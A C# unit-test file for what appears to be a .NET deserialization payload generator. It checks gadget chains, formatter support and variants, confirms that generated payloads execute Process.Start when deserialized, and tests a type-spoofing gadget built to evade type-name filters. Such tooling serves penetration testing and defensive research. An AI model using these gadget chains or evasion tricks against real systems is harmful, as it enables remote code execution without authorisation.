        private static void CommandInputTypes()
        {
            // Each gadget declares what -c means; the wizard relies on this.
            AssertEqual(CommandInputType.ShellCommand, Gadget("ObjectDataProvider").CommandInput(), "ODP is a shell command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateSelector").CommandInput(), "ASS ignores the command");
            AssertEqual(CommandInputType.Ignored, Gadget("ActivitySurrogateDisableTypeCheck").CommandInput(), "ASDTC ignores the command");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("ActivitySurrogateSelectorFromFile").CommandInput(), "ASSFromFile takes a .cs file");
            AssertEqual(CommandInputType.CsSourceFile, Gadget("XamlAssemblyLoadFromFile").CommandInput(), "XamlAssemblyLoadFromFile takes a .cs file");
            AssertEqual(CommandInputType.DllPath, Gadget("BaseActivationFactory").CommandInput(), "BaseActivationFactory takes a DLL path");
            AssertEqual(CommandInputType.DllPath, Gadget("GetterCompilerResults").CommandInput(), "GetterCompilerResults takes a DLL path");
            AssertEqual(CommandInputType.Url, Gadget("ObjRef").CommandInput(), "ObjRef takes a URL");
            AssertEqual(CommandInputType.FilePath, Gadget("XamlImageInfo").CommandInput(), "XamlImageInfo takes a file path");
            // A path the TARGET touches, not a file read here. FileLogTraceListener was
            // moved off FilePath for exactly that reason: the FilePath help says "this
            // gadget reads the file", which was never true of it.
            AssertEqual(CommandInputType.TargetPath, Gadget("FileLogTraceListener").CommandInput(),
                "FileLogTraceListener takes a path on the target");
            AssertEqual(CommandInputType.TargetPathAndLocalFile,
                Gadget("TypeConfuseDelegateFileOperations").CommandInput(),
                "TypeConfuseDelegateFileOperations defaults to target path + local content file");

            // Prompt labels follow the type.
            AssertEqual("Command to run", Wizard.CommandLabel(CommandInputType.ShellCommand), "shell label");
            AssertEqual("Path to .dll", Wizard.CommandLabel(CommandInputType.DllPath), "dll label");
            AssertEqual("URL", Wizard.CommandLabel(CommandInputType.Url), "url label");
            AssertEqual("calc.exe", Wizard.CommandDefault(CommandInputType.ShellCommand), "shell default");
            AssertEqual("", Wizard.CommandDefault(CommandInputType.DllPath), "dll has no default");

            // Every input type needs its own menu name, prompt label and help sentence, or
            // a new one silently inherits the shell-command wording. The help must also say
            // whose file system a path belongs to, which is the whole point of the split.
            var seenNames = new HashSet<string>(StringComparer.Ordinal);
            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
            {
                AssertTrue(seenNames.Add(Wizard.InputTypeName(t)),
                    "CommandInputType." + t + " has its own menu name");
                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandLabel(t)),
                    "CommandInputType." + t + " has a prompt label");
                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandHelp(t)),
                    "CommandInputType." + t + " has help text");
            }
            // A path or URL has no sensible default; only the shell-style inputs get one.
            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
            {
                bool shellStyle = t == CommandInputType.ShellCommand || t == CommandInputType.Ignored;
                AssertEqual(shellStyle ? "calc.exe" : "", Wizard.CommandDefault(t),
                    "CommandInputType." + t + " default value");
            }
            foreach (CommandInputType t in new[] { CommandInputType.TargetPath,
                CommandInputType.TargetPathPair, CommandInputType.TargetPathAndLocalFile })
                AssertTrue(Wizard.CommandHelp(t).Contains("TARGET"),
                    "CommandInputType." + t + " help says the path belongs to the target");
            AssertTrue(Wizard.CommandHelp(CommandInputType.TargetPathAndLocalFile).Contains("THIS machine"),
                "the write help also names the operator-side file");
            AssertTrue(Wizard.CommandHelp(CommandInputType.FilePath).Contains("HERE"),
                "FilePath help says the file is read on this machine");
        }

        private static void IgnoredCommandGadget()
        {
            // ActivitySurrogateDisableTypeCheck ignores -c (it just flips a protection
            // flag). It must generate with no command, and both the CLI and the
            // interactive editor must treat the command as unneeded.
            const string name = "ActivitySurrogateDisableTypeCheck";
            AssertEqual(CommandInputType.Ignored, Gadget(name).CommandInput(), "gadget ignores the command");

            // Interactive: the command and rawcmd fields are hidden, command not required.
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest(name);
            EditableField cmd = FindEditable(fields, "command");
            EditableField rawcmd = FindEditable(fields, "rawcmd");
            AssertTrue(cmd != null && cmd.Hidden && !cmd.Required, "command field hidden and optional");
            AssertTrue(rawcmd != null && rawcmd.Hidden, "rawcmd field hidden");

            // The equivalent command line omits -c when there is no command.
            var tokens = CommandEcho.GadgetTokens(name, "LosFormatter", "",
                false, false, "", "", "", false, false, false, false, null);
            AssertTrue(!tokens.Contains("-c"), "no -c token for an ignored command");

            // Core generation succeeds with an empty command.
            InputArgs ia = new InputArgs();
            ia.Cmd = "";
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = name;
            req.FormatterName = "LosFormatter";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            AssertTrue(r.Success, "generates with no command: " + r.ErrorMessage);
            AssertTrue(r.Raw != null, "produced a payload");
        }

        private static IGenerator Gadget(string name)
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
            if (g == null)
                throw new Exception("gadget not found: " + name);
            return g;
        }

        private static void GadgetsDeclareVariants()
        {
            AssertEqual(2, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 2 variants");
            AssertEqual(2, Gadget("XamlImageInfo").Variants().Count, "XamlImageInfo declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
            AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
            AssertEqual(2, Gadget("ResourceSet").Variants().Count, "ResourceSet (ig option) declares 2 variants");

            // TypeConfuseDelegate selects the serialized ROOT CONTAINER that carries the
            // same Comparison<string> -> Process.Start splice. Variant 1 is the original
            // SortedSet default; 2 and 3 are the SortedSet-wire-name evasion roots.
            var tcd = Gadget("TypeConfuseDelegate").Variants();
            AssertEqual(3, tcd.Count, "TypeConfuseDelegate declares 3 container variants");
            for (int i = 0; i < tcd.Count; i++)
            {
                AssertEqual(i + 1, tcd[i].Number, "TypeConfuseDelegate variant " + (i + 1) + " is numbered " + (i + 1));
                AssertTrue(!string.IsNullOrEmpty(tcd[i].Label), "TypeConfuseDelegate variant " + (i + 1) + " carries a label");
                AssertEqual(0, tcd[i].UnsupportedFormatters.Count,
                    "TypeConfuseDelegate variant " + (i + 1) + " opts out of no formatter (the container swap does not narrow the set)");
            }
            AssertTrue(tcd[0].Label.IndexOf("SortedSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 1 is labelled SortedSet");
            AssertTrue(tcd[1].Label.IndexOf("SortedDictionary", StringComparison.OrdinalIgnoreCase) >= 0, "variant 2 is labelled SortedDictionary");
            AssertTrue(tcd[2].Label.IndexOf("TreeSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 3 is labelled TreeSet");

            var v = Gadget("ObjectDataProvider").Variants();
            AssertEqual(1, v[0].Number, "first variant is number 1");
            AssertTrue(!string.IsNullOrEmpty(v[0].Label), "variants carry a label");

            // CATALOGUE-WIDE INVARIANT, not a spot check on the gadgets named above: every
            // non-empty Variants() list is exactly 1, 2, ..., N in that order. Variant 1 is
            // the default the CLI and the wizard fall back to, and the number is what a user
            // types, so a gap, a duplicate or an out-of-order entry means some surface is
            // offering a variant that builds something else - or nothing.
            //
            // A RETIRED VARIANT IS STILL A GAP. When a payload leaves a gadget, renumber the
            // survivors and record the move in the option help, the docs and the changelog;
            // do not leave the hole. ObjectDataProvider is the worked example: its XAML-url
            // payload became the ResourceDictionary gadget and the WorkflowDesigner wrapper
            // moved from 4 to 3.
            var numbering = new List<string>();
            foreach (string name in GadgetRegistry.GetGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null) continue;
                List<GadgetVariant> declared = g.Variants();
                if (declared == null || declared.Count == 0) continue;

                for (int i = 0; i < declared.Count; i++)
                {
                    if (declared[i].Number != i + 1)
                    {
                        numbering.Add(name + " declares ["
                            + string.Join(",", declared.ConvertAll(d => d.Number.ToString()).ToArray())
                            + "] instead of 1.." + declared.Count);
                        break;
                    }
                }
            }
            AssertEqual(0, numbering.Count,
                "every gadget with variants numbers them 1..N in order: "
                    + string.Join("; ", numbering.ToArray()));
        }

        private static void VariantInputTypes()
        {
            // XamlImageInfo is the reference case: its variants take different -c
            // inputs, so each variant declares its own. Variant 1 reads a file,
            // variant 2 runs a command.
            var xii = Gadget("XamlImageInfo");
            var vs = xii.Variants();
            AssertEqual(CommandInputType.FilePath, vs[0].EffectiveInput(xii.CommandInput()), "XamlImageInfo v1 = file path");
            AssertEqual(CommandInputType.ShellCommand, vs[1].EffectiveInput(xii.CommandInput()), "XamlImageInfo v2 = shell command");

            // A variant with no declared input falls back to the gadget default.
            var odp = Gadget("ObjectDataProvider");
            var ov = odp.Variants();
            AssertEqual(odp.CommandInput(), ov[0].EffectiveInput(odp.CommandInput()), "ODP variant inherits the gadget input");
            AssertTrue(!ov[0].Input.HasValue, "ODP variant declares no per-variant input");
        }

        private static void VariantFormatterOptOutDataModel()
        {
            // The per-variant opt-out data model: a variant can NARROW the gadget's
            // formatters, and the check is first-token and case-insensitive, matching
            // IsSupported / the wizard's FormatterTokens.
            var narrowed = new GadgetVariant(1, "x").Without("SoapFormatter");
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter"), "an opted-out formatter is not supported");
            AssertTrue(narrowed.SupportsFormatter("BinaryFormatter"), "a different formatter is still supported");
            // Robust token match: a listed value carrying a suffix still matches the opt-out.
            AssertTrue(!narrowed.SupportsFormatter("SoapFormatter (2)"), "opt-out matches on the first token, not the whole string");
            AssertTrue(!new GadgetVariant(1, "x").Without("SoapFormatter").SupportsFormatter("soapformatter"), "opt-out is case-insensitive");

            // A variant with no opt-out supports every formatter (the default, empty list).
            var open = new GadgetVariant(2, "y");
            AssertEqual(0, open.UnsupportedFormatters.Count, "the opt-out list defaults to empty");
            AssertTrue(open.SupportsFormatter("SoapFormatter"), "no opt-out means every formatter is supported");
            AssertTrue(open.SupportsFormatter("BinaryFormatter"), "no opt-out means every formatter is supported (2)");
        }

        private static void VariantFormatterOptOutWiring()
        {
            // The two affected gadgets: variant 1 (TypeConfuseDelegate, a generic
            // SortedSet) opts out of SoapFormatter; variant 2 (TextFormattingRunProperties)
            // does not. The gadget-level union still advertises SoapFormatter.
            foreach (string name in new string[] { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" })
            {
                var vs = Gadget(name).Variants();
                AssertEqual(2, vs.Count, name + " declares 2 variants");
                AssertTrue(vs[0].UnsupportedFormatters.Contains("SoapFormatter"), name + " variant 1 declares the SoapFormatter opt-out");
                AssertTrue(!vs[0].SupportsFormatter("SoapFormatter"), name + " variant 1 does not support SoapFormatter");
                AssertTrue(vs[0].SupportsFormatter("BinaryFormatter"), name + " variant 1 still supports BinaryFormatter");
                AssertEqual(0, vs[1].UnsupportedFormatters.Count, name + " variant 2 has no opt-out");
                AssertTrue(vs[1].SupportsFormatter("SoapFormatter"), name + " variant 2 supports SoapFormatter");
                AssertTrue(Gadget(name).IsSupported("SoapFormatter"), name + " still lists SoapFormatter at the gadget level (union)");
            }

            // DataTable is the opposite shape: variant 1 (TextFormattingRunProperties) is
            // the compatible default and keeps every formatter; variant 2 (TypeConfuseDelegate,
            // a generic SortedSet) opts out of SoapFormatter but keeps BinaryFormatter and
            // LosFormatter. The gadget-level union still advertises SoapFormatter.
            var dt = Gadget("DataTable").Variants();
            AssertEqual(2, dt.Count, "DataTable declares exactly 2 variants");
            AssertEqual(1, dt[0].Number, "DataTable variant 1 is numbered 1");
            AssertEqual(2, dt[1].Number, "DataTable variant 2 is numbered 2");
            AssertEqual(0, dt[0].UnsupportedFormatters.Count, "DataTable variant 1 has no opt-out");
            AssertTrue(dt[0].SupportsFormatter("SoapFormatter"), "DataTable variant 1 supports SoapFormatter");
            AssertTrue(dt[1].UnsupportedFormatters.Contains("SoapFormatter"), "DataTable variant 2 declares the SoapFormatter opt-out");
            AssertTrue(!dt[1].SupportsFormatter("SoapFormatter"), "DataTable variant 2 does not support SoapFormatter");
            AssertTrue(dt[1].SupportsFormatter("BinaryFormatter"), "DataTable variant 2 still supports BinaryFormatter");
            AssertTrue(dt[1].SupportsFormatter("LosFormatter"), "DataTable variant 2 still supports LosFormatter");
            AssertTrue(Gadget("DataTable").IsSupported("SoapFormatter"), "DataTable still lists SoapFormatter at the gadget level (union)");

            // DataTableTypeSpoof carries the same two inner gadgets, so it must declare the
            // same shape. If the two ever drift, one of them is advertising a cell it cannot
            // build.
            var dts = Gadget("DataTableTypeSpoof").Variants();
            AssertEqual(2, dts.Count, "DataTableTypeSpoof declares exactly 2 variants");
            AssertEqual(0, dts[0].UnsupportedFormatters.Count, "DataTableTypeSpoof variant 1 has no opt-out");
            AssertTrue(dts[1].UnsupportedFormatters.Contains("SoapFormatter"), "DataTableTypeSpoof variant 2 declares the SoapFormatter opt-out");
            AssertTrue(dts[1].SupportsFormatter("BinaryFormatter"), "DataTableTypeSpoof variant 2 still supports BinaryFormatter");
            AssertTrue(dts[1].SupportsFormatter("LosFormatter"), "DataTableTypeSpoof variant 2 still supports LosFormatter");
            AssertTrue(Gadget("DataTableTypeSpoof").IsSupported("SoapFormatter"), "DataTableTypeSpoof still lists SoapFormatter at the gadget level (union)");
        }

        private static void EditorBlocksVariantFormatterMismatch()
        {
            // The editor validates a variant+formatter mismatch at generate: variant 1 of
            // ActivitySurrogateDisableTypeCheck cannot produce SoapFormatter, so the editor
            // blocks with a precise line naming the setting, the formatter, and the variant.
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest("ActivitySurrogateDisableTypeCheck");

            // Default variant is 1; pick the opted-out formatter.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string p = ed.MissingVariantFormatterProblemForTest();
            AssertTrue(p != null, "variant 1 + SoapFormatter is reported as a problem");
            AssertTrue(p.Contains("formatter") && p.Contains("SoapFormatter") && p.Contains("variant 1"),
                "the problem names the setting, the formatter, and the variant: " + p);

            // A supported formatter on the same variant is fine.
            FindEditable(fields, "formatter").Value = "BinaryFormatter";
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 1 + BinaryFormatter is fine");

            // Switching to variant 2 (TextFormattingRunProperties) makes Soap fine again.
            FindEditable(fields, "formatter").Value = "SoapFormatter";
            string v2label = Gadget("ActivitySurrogateDisableTypeCheck").Variants()[1].Label;
            FindEditable(fields, "variant").Value = v2label;
            AssertTrue(ed.MissingVariantFormatterProblemForTest() == null, "variant 2 + SoapFormatter is fine");
        }

        private static void GuardBlocksVariantFormatterOnNonUiPath()
        {
            // The non-UI guard (GuardVariantFormatter in Generate) turns the impossible
            // variant 1 + SoapFormatter pair into a clean RunResult.Fail carrying the
            // guard message, not the raw framework "Generic Types" string. This drives
            // the same PayloadRunner.GenerateGadget path the CLI uses.
            // ActivitySurrogateDisableTypeCheck ignores -c (no file compile), so it is fast.
            RunResult v1soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 1);
            AssertTrue(!v1soap.Success, "variant 1 + SoapFormatter fails");
            AssertTrue((v1soap.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired, not the raw framework error: " + v1soap.ErrorMessage);

            // An unaffected formatter on the same variant still generates.
            RunResult v1bin = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "BinaryFormatter", 1);
            AssertTrue(v1bin.Success, "variant 1 + BinaryFormatter still generates: " + v1bin.ErrorMessage);

            // Variant 2 (TextFormattingRunProperties) is not generic, so Soap works.
            RunResult v2soap = GenerateWithVariant("ActivitySurrogateDisableTypeCheck", "SoapFormatter", 2);
            AssertTrue(v2soap.Success, "variant 2 + SoapFormatter generates: " + v2soap.ErrorMessage);

            // DataTable is the mirror image: its variant 2 (TypeConfuseDelegate) is the
            // generic one, so variant 2 + SoapFormatter is the guarded pair. Variant 1
            // (TextFormattingRunProperties) + SoapFormatter and variant 2 + BinaryFormatter
            // must both still generate.
            RunResult dtV2soap = GenerateWithVariant("DataTable", "SoapFormatter", 2);
            AssertTrue(!dtV2soap.Success, "DataTable variant 2 + SoapFormatter fails");
            AssertTrue((dtV2soap.ErrorMessage ?? "").IndexOf("is not supported by variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired for DataTable, not the raw framework error: " + dtV2soap.ErrorMessage);

            RunResult dtV1soap = GenerateWithVariant("DataTable", "SoapFormatter", 1);
            AssertTrue(dtV1soap.Success, "DataTable variant 1 + SoapFormatter still generates: " + dtV1soap.ErrorMessage);

            RunResult dtV2bin = GenerateWithVariant("DataTable", "BinaryFormatter", 2);
            AssertTrue(dtV2bin.Success, "DataTable variant 2 + BinaryFormatter generates: " + dtV2bin.ErrorMessage);
        }

        // GenericIdentity reaches the ClaimsIdentity nested-BinaryFormatter sink through a
        // DIFFERENT root type than the ClaimsIdentity gadget. Because GenericIdentity derives
        // from ClaimsIdentity, the inherited private field is exposed by FormatterServices
        // under the prefixed name "ClaimsIdentity+m_serializedClaims" (SOAP encodes the plus as
        // _x002B_). Lock both facts so the payload cannot silently regress to the plain
        // ClaimsIdentity root type or the unprefixed field name, which would not deserialize
        // onto a GenericIdentity.
        private static void GenericIdentityCarriesDerivedType()
        {
            GenerationRequest bfReq = new GenerationRequest
            {
                GadgetName = "GenericIdentity",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            };
            RunResult bf = PayloadRunner.GenerateGadget(bfReq);
            AssertTrue(bf.Success, "GenericIdentity BinaryFormatter generates: " + bf.ErrorMessage);
            string bfText = System.Text.Encoding.ASCII.GetString((byte[])bf.Raw);
            AssertTrue(bfText.Contains("System.Security.Principal.GenericIdentity"),
                "BinaryFormatter payload carries the GenericIdentity root type");
            AssertTrue(bfText.Contains("ClaimsIdentity+m_serializedClaims"),
                "BinaryFormatter payload uses the inherited prefixed field name");

            GenerationRequest soapReq = new GenerationRequest
            {
                GadgetName = "GenericIdentity",
                FormatterName = "SoapFormatter",
                OutputFormat = "",
                InputArgs = CalcInput(),
            };
            RunResult soap = PayloadRunner.GenerateGadget(soapReq);
            AssertTrue(soap.Success, "GenericIdentity SoapFormatter generates: " + soap.ErrorMessage);
            string soapText = soap.Raw is byte[] ? System.Text.Encoding.ASCII.GetString((byte[])soap.Raw) : (string)soap.Raw;
            AssertTrue(soapText.Contains("GenericIdentity"),
                "SoapFormatter payload carries the GenericIdentity element");
            AssertTrue(soapText.Contains("ClaimsIdentity_x002B_m_serializedClaims"),
                "SoapFormatter payload uses the XML-encoded inherited prefixed field name");
        }

        // DataContractJsonSerializer needs its root type supplied at construction (the JSON has
        // no resolvable type token), so the generic fire markers cannot drive it. This fires each
        // ClaimsIdentity-family gadget's DCJson payload with the correct root type and asserts the
        // inner TFRP executes (marker), raw and minified. The post-fire cast throws after firing;
        // the marker file is the proof.
        private static void DataContractJsonFiresForClaimsFamily()
        {
            const string mscorlib = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
            var map = new List<string[]>
            {
                new[] { "ClaimsIdentity",   "System.Security.Claims.ClaimsIdentity, " + mscorlib },
                new[] { "GenericIdentity",  "System.Security.Principal.GenericIdentity, " + mscorlib },
                new[] { "ClaimsPrincipal",  "System.Security.Claims.ClaimsPrincipal, " + mscorlib },
                new[] { "GenericPrincipal", "System.Security.Principal.GenericPrincipal, " + mscorlib },
                new[] { "FormsIdentity",    "System.Web.Security.FormsIdentity, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" },
            };
            foreach (string[] entry in map)
            {
                string gadget = entry[0];
                string aqn = entry[1];
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    using (FireTarget fire = FireBackend.Create("DCJson_" + gadget + (minify ? "_m" : "")))
                    {
                        InputArgs ia = new InputArgs();
                        ia.Cmd = fire.Command;
                        ia.IsRawCmd = true;
                        ia.Test = false;
                        ia.Minify = minify;
                        GenerationRequest req = new GenerationRequest
                        {
                            GadgetName = gadget,
                            FormatterName = "DataContractJsonSerializer",
                            OutputFormat = "",
                            InputArgs = ia,
                        };
                        RunResult r = PayloadRunner.GenerateGadget(req);
                        AssertTrue(r.Success, "DCJson generate " + gadget + ": " + r.ErrorMessage);

                        string json = (string)r.Raw;
                        RunSTA(delegate { SerializersHelper.DataContractJsonSerializer_deserialize(json, aqn, null); });

                        AssertTrue(fire.Wait(MarkerWaitMs),
                            "DataContractJsonSerializer fires for " + gadget + (minify ? " (minify)" : ""));
                    }
                }
            }
        }

        // FormsIdentity is in System.Web, so its BinaryFormatter stream carries an explicit
        // BinaryAssembly record and the required _Ticket member. The standard fire markers
        // deserialize in the default Simple assembly mode, which tolerates missing members.
        // This locks the stricter Full mode: it proves the System.Web assembly record and the
        // _Ticket member are actually present and correct, not just tolerated. The inner TFRP
        // fires Process.Start (dropping the marker) then throws a cast error; the marker is the
        // proof of execution.
        private static void FormsIdentityFiresUnderFullAssemblyMode()
        {
            using (FireTarget fire = FireBackend.Create("FormsIdentity_BF_Full"))
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = fire.Command;
                ia.IsRawCmd = true;
                ia.Test = false;
                GenerationRequest req = new GenerationRequest
                {
                    GadgetName = "FormsIdentity",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                };
                RunResult r = PayloadRunner.GenerateGadget(req);
                AssertTrue(r.Success, "FormsIdentity BinaryFormatter generates: " + r.ErrorMessage);

                byte[] payload = (byte[])r.Raw;
                RunSTA(delegate
                {
                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                    bf.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Full;
                    using (var ms = new MemoryStream(payload))
                        bf.Deserialize(ms);
                });

                AssertTrue(fire.Wait(MarkerWaitMs),
                    "FormsIdentity BinaryFormatter payload fires under AssemblyFormat=Full");
            }
        }

        // Drive PayloadRunner.GenerateGadget for one gadget/formatter/variant with a
        // never-executed placeholder command (Test=false), the same as a matrix cell.
        private static RunResult GenerateWithVariant(string gadget, string formatter, int variant)
        {
            InputArgs ia = CalcInput();
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = gadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // Adding the variant selector must not change DataTable's default payload: with no
        // option, DataTable must produce the exact same bytes as an explicit --variant 1,
        // across every advertised formatter and both minify states. This locks backward
        // compatibility without hardcoding runtime-sensitive payload hashes: it compares two
        // live generations of the same command, so it stays valid as the payload evolves.
        private static void DataTableDefaultEqualsVariantOne()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;

                    RunResult def = GenerateDataTable(formatter, minify, null);
                    RunResult v1 = GenerateDataTable(formatter, minify, 1);

                    string desc = "DataTable -f " + formatter + (minify ? " (minify)" : "");
                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
                    AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);

                    byte[] a = def.Raw as byte[];
                    byte[] b = v1.Raw as byte[];
                    AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
                    AssertTrue(BytesEqual(a, b),
                        "implicit default equals explicit variant 1 byte-for-byte: " + desc);
                }
            }
        }

        // Generate DataTable with a never-executed placeholder command. Pass variant=null
        // for the implicit default (no --variant), or a number for an explicit selection.
        private static RunResult GenerateDataTable(string formatter, bool minify, int? variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe";
            ia.Test = false;
            ia.Minify = minify;
            if (variant.HasValue)
                ia.ExtraArguments = new List<string> { "--variant", variant.Value.ToString() };
            GenerationRequest req = new GenerationRequest
            {
                GadgetName = "DataTable",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            };
            return PayloadRunner.GenerateGadget(req);
        }

        // ---- DataTableTypeSpoof: the same carrier under a subclass name --------
        //
        // The whole point of this gadget is the TYPE NAME on the wire, so the focused tests
        // assert the emitted bytes rather than trusting that generation succeeded. Two
        // encodings break a naive search and SearchableWire handles both: LosFormatter
        // returns base64 text, and SoapFormatter splits a type name into an element name plus
        // an "nsassem" namespace holding the CLR namespace and a percent-encoded assembly
        // identity, so the joined name never appears in SOAP output at all.

        // The default profile must reach the wire on every advertised formatter and both
        // minify states, and the payload must NOT carry a System.Data.DataTable type record -
        // that record is exactly what a name filter looks for.
        private static void DataTableTypeSpoofNamesTheSubclassOnTheWire()
        {
            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string desc = "DataTableTypeSpoof -f " + formatter + (minify ? " (minify)" : "");

                    RunResult r = GenerateDataTableTypeSpoof(formatter, minify, null, null, null);
                    AssertTrue(r.Success, desc + " generates: " + r.ErrorMessage);
                    string wire = SearchableWire(r, formatter);

                    if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
                    {
                        AssertTrue(wire.Contains("nsassem/System.Data.Entity.Design.SsdlGenerator/"),
                            desc + " carries the subclass namespace: " + desc);
                        AssertTrue(wire.Contains(":TableDetailsCollection"),
                            desc + " carries the subclass element name");
                        // The assembly identity sits inside the namespace URI, so its shape
                        // depends on --minify: raw SOAP percent-encodes the commas and spaces,
                        // and the XML minifier writes the decoded form with the spaces after
                        // each comma collapsed. Both name the same assembly and both bind, so
                        // the check is per state rather than one loose substring.
                        AssertTrue(wire.Contains(minify
                                ? "System.Data.Entity.Design,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"
                                : "System.Data.Entity.Design%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"),
                            desc + " carries the full assembly identity in the form this state writes");
                    }
                    else
                    {
                        AssertTrue(wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetType),
                            desc + " carries the default subclass type name");
                        AssertTrue(wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetAssembly),
                            desc + " carries the full assembly identity");
                    }

                    AssertTrue(!wire.Contains("System.Data.DataTable"),
                        desc + " writes no System.Data.DataTable type record");
                }
            }
        }

        // The operator's names are written exactly as typed: no validation, no rewriting, no
        // fallback to the default. The custom type carries an apostrophe and a space, which a
        // gadget that "cleaned up" the value would lose.
        private static void DataTableTypeSpoofWritesTheOperatorTypeVerbatim()
        {
            const string customType = "Contoso.Data.O'Brien Orders";
            const string customAssembly = "Contoso.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";

            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
            {
                RunResult r = GenerateDataTableTypeSpoof(formatter, false, null, customType, customAssembly);
                AssertTrue(r.Success, formatter + " generates with operator names: " + r.ErrorMessage);
                string wire = SearchableWire(r, formatter);

                AssertTrue(wire.Contains(customType), formatter + " writes the type name byte-for-byte");
                AssertTrue(wire.Contains(customAssembly), formatter + " writes the assembly identity byte-for-byte");
                AssertTrue(!wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetType),
                    formatter + " drops the default profile once the operator names their own type");
            }

            // SOAP writes the same names, split the way the SOAP encoder writes any type: an
            // element name plus the namespace and the percent-encoded assembly. The type name
            // here is XML-safe because the SOAP writer puts it in an element name; that is the
            // formatter's constraint, not a check this gadget makes.
            RunResult soap = GenerateDataTableTypeSpoof("SoapFormatter", false, null,
                "Contoso.Data.OrdersTable", customAssembly);
            AssertTrue(soap.Success, "SoapFormatter generates with operator names: " + soap.ErrorMessage);
            string soapWire = SearchableWire(soap, "SoapFormatter");
            AssertTrue(soapWire.Contains("nsassem/Contoso.Data/"), "SOAP carries the operator's namespace");
            AssertTrue(soapWire.Contains(":OrdersTable"), "SOAP carries the operator's element name");
            AssertTrue(soapWire.Contains("Contoso.Data%2C%20Version%3D1.0.0.0"),
                "SOAP carries the operator's assembly identity");

            // The one refusal: a name that cannot be written at all. Nothing else is policed.
            RunResult emptyType = GenerateDataTableTypeSpoof("BinaryFormatter", false, null, "   ", null);
            AssertTrue(!emptyType.Success, "an empty --target-type is refused");
            AssertTrue((emptyType.ErrorMessage ?? "").IndexOf("non-empty --target-type", StringComparison.OrdinalIgnoreCase) >= 0,
                "the refusal names the option: " + emptyType.ErrorMessage);

            RunResult emptyAssembly = GenerateDataTableTypeSpoof("BinaryFormatter", false, null, null, "   ");
            AssertTrue(!emptyAssembly.Success, "an empty --target-assembly is refused");
            AssertTrue((emptyAssembly.ErrorMessage ?? "").IndexOf("non-empty --target-assembly", StringComparison.OrdinalIgnoreCase) >= 0,
                "the refusal names the option: " + emptyAssembly.ErrorMessage);
        }

        // Variant 2 wraps TypeConfuseDelegate (a generic SortedSet), which SoapFormatter
        // cannot serialize. The guard must fire with its stable phrase BEFORE the deep
        // framework exception, exactly as it does on the DataTable gadget.
        private static void DataTableTypeSpoofRefusesVariant2WithSoap()
        {
            RunResult v2soap = GenerateWithVariant("DataTableTypeSpoof", "SoapFormatter", 2);
            AssertTrue(!v2soap.Success, "DataTableTypeSpoof variant 2 + SoapFormatter fails");
            AssertTrue((v2soap.ErrorMessage ?? "").IndexOf("is not supported by variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
                "the guard fired, not the raw framework error: " + v2soap.ErrorMessage);

